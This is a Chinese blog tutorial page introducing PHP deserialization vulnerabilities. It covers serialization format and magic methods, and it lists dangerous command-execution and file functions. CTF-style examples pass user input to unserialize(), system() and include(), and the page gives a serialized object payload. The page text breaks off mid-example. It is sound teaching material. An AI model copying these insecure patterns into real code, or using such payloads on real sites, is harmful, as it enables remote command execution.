@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前置知识 面向对象编程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于反序列化漏洞的初探">
+<meta property="og:url" content="https://southsea.st/Study-Unserialize-PHP/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="前置知识 面向对象编程">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-11-12T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.075Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Unserialize">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/Study-Unserialize-PHP/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/Study-Unserialize-PHP/","path":"Study-Unserialize-PHP/","title":"关于反序列化漏洞的初探"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>关于反序列化漏洞的初探 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.</span> <span class="nav-text">简单介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.1.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">一个小知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C%E8%A7%A3%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">序列化结果解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3"><span class="nav-number">2.4.</span> <span class="nav-text">序列化结果类型详解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%BB%93%E8%AE%BA"><span class="nav-number">3.1.</span> <span class="nav-text">一个重要结论</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="nav-number">3.2.</span> <span class="nav-text">一个例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">3.3.</span> <span class="nav-text">常见的魔术方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E9%87%8D%E7%82%B9%E6%B3%A8%E6%84%8F%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">3.4.</span> <span class="nav-text">需要重点注意的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.4.1.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.4.2.</span> <span class="nav-text">文件操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E4%BE%8B%E5%AD%90"><span class="nav-number">3.5.</span> <span class="nav-text">一些例子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90"><span class="nav-number">3.5.1.</span> <span class="nav-text">简单例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#welcome-to-bugkuctf"><span class="nav-number">3.5.2.</span> <span class="nav-text">welcome to bugkuctf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">3.5.3.</span> <span class="nav-text">PHP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#refer"><span class="nav-number">4.</span> <span class="nav-text">Refer</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/Study-Unserialize-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="关于反序列化漏洞的初探 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于反序列化漏洞的初探
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-11-12 00:00:00" itemprop="dateCreated datePublished" datetime="2018-11-12T00:00:00+00:00">2018-11-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前置知识">前置知识</h1>
+<p>面向对象编程</p>
+<span id="more"></span>
+<h1 id="简单介绍">简单介绍</h1>
+<p>在<strong>PHP</strong>中存在两个方法，分别是<strong>serialize()</strong>和<strong>unserialize()</strong>这两个。</p>
+<h2 id="示例">示例</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个类person</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建一个对象south</span></span><br><span class="line">    <span class="variable">$south</span> = <span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line">    <span class="variable">$south</span> -&gt; name = <span class="string">&quot;south&quot;</span>;</span><br><span class="line">    <span class="variable">$south</span> -&gt; age = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出序列化后的值</span></span><br><span class="line">    <span class="variable">$north</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$south</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$north</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将north反序列化成对象southseast</span></span><br><span class="line">    <span class="variable">$southseast</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$north</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$southseast</span>-&gt;name.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后下面是输出结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;person&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;south&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br><span class="line">south</span><br></pre></td></tr></table></figure>
+<p>可以很明显的看到其实是序列化其实是类似于把一个对象进行了<strong>Json</strong>格式化【只是长得像，实质格式完全不同。</p>
+<h2 id="一个小知识点">一个小知识点</h2>
+<p>对象的私有成员变量，类名称前会加上*****。</p>
+<h2 id="序列化结果解析">序列化结果解析</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O: // 类型：</span><br><span class="line">6: // 类型名长度：</span><br><span class="line">&quot;person&quot;: // 类型名：</span><br><span class="line">2: // 成员变量个数</span><br><span class="line">&#123;s: // &#123;第一个成员变量类型：</span><br><span class="line">4: // 第一个成员变量名长度：</span><br><span class="line">&quot;name&quot;; // 第一个成员变量名；</span><br><span class="line">s: // 第一个成员变量值类型：</span><br><span class="line">5: // 第一个成员变量值长度：</span><br><span class="line">&quot;south&quot;; // 第一个成员变量值；</span><br><span class="line">s: // 第二个成员变量类型：</span><br><span class="line">3: // 第二个成员变量名长度：</span><br><span class="line">&quot;age&quot;; // 第二个成员变量名；</span><br><span class="line">i: // 第二个成员变量值类型：</span><br><span class="line">18;&#125; // 第二个成员变量值；</span><br></pre></td></tr></table></figure>
+<h2 id="序列化结果类型详解">序列化结果类型详解</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array  </span><br><span class="line">b - boolean  </span><br><span class="line">d - double  </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞原理">漏洞原理</h1>
+<p><strong>PHP</strong>中引起反序列化漏洞的主要原因是<strong>PHP</strong>的魔术方法【<strong>magic
+function</strong>，由双下划线开头的函数如**__construct()**等会在某些情况下会自动调用。</p>
+<h2 id="一个重要结论">一个重要结论</h2>
+<p>反序列化漏洞的产生原因是用户输入的数据具有危险性，而并非是反序列化本身。</p>
+<p>看看<a
+target="_blank" rel="noopener" href="http://www.php.net/manual/zh/language.oop5.magic.php">官方文档</a>对魔术方法的介绍。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在PHP中被称为&quot;魔术方法&quot;（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</span><br></pre></td></tr></table></figure>
+<p>举个例子，看看**__construct()**<a
+target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.decon.php#object.construct">这个函数</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP5允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</span><br></pre></td></tr></table></figure>
+<h2 id="一个例子">一个例子</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建一个对象south</span></span><br><span class="line">    <span class="variable">$south</span> = <span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line">    <span class="variable">$south</span> -&gt; name = <span class="string">&quot;south&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出序列化后的值</span></span><br><span class="line">    <span class="variable">$north</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$south</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$north</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将north反序列化成对象southseast</span></span><br><span class="line">    <span class="variable">$southseast</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$north</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$southseast</span>-&gt;age.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码运行后得到的最终结果是<strong>age=18</strong>，很明显的推断就是同官方文档所说，在创建一个对象的时候<strong>PHP</strong>自动执行了对象内的**__construct()**函数。</p>
+<h2 id="常见的魔术方法">常见的魔术方法</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() // 使用unserialize时触发</span><br><span class="line">__sleep() // 使用serialize时触发</span><br><span class="line">__destruct() // 对象被销毁时触发</span><br><span class="line">__call() // 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() // 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() // 用于从不可访问的属性读取数据</span><br><span class="line">__set() // 用于将数据写入不可访问的属性</span><br><span class="line">__isset() // 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() // 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() // 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() // 当脚本尝试将对象调用为函数时触发</span><br><span class="line">__construct() // 当一个对象创建时被调用</span><br><span class="line">__destruct() // 当一个对象销毁时被调用</span><br></pre></td></tr></table></figure>
+<h2 id="需要重点注意的函数">需要重点注意的函数</h2>
+<h3 id="命令执行">命令执行</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure>
+<h3 id="文件操作">文件操作</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure>
+<p>如果在跟进程序过程中发现这些函数就要打起精神，一旦这些函数的参数我们能够控制，就有可能出现高危漏洞。</p>
+<h2 id="一些例子">一些例子</h2>
+<h3 id="简单例子">简单例子</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$command</span>=<span class="string">&quot;php hello.txt&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$command</span>)</span><br><span class="line">        <span class="variable">$hello</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$hello</span>-&gt;<span class="title function_ invoke__">visit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此处如果构造一个对象的<strong>command</strong>参数是一段恶意代码并序列化后传参进入，就能造成一个有效攻击。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$command</span>=<span class="string">&quot;php hello.txt&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$hello</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Payload</strong>如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Hello&quot;:1:&#123;s:7:&quot;command&quot;;s:13:&quot;php hello.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>就能访问到目录下的<strong>flag</strong>文件了。</p>
+<h3 id="welcome-to-bugkuctf"><a
+target="_blank" rel="noopener" href="http://120.24.86.145:8006/test1/">welcome to bugkuctf</a></h3>
+<p>今年黑盾有一题也跟这个一样，解法写在另一篇讲述<a
+href="https://southsea.st/2018/08/01/Study-File-Inclusion/">文件包含</a>的文章中了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php 部分代码</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
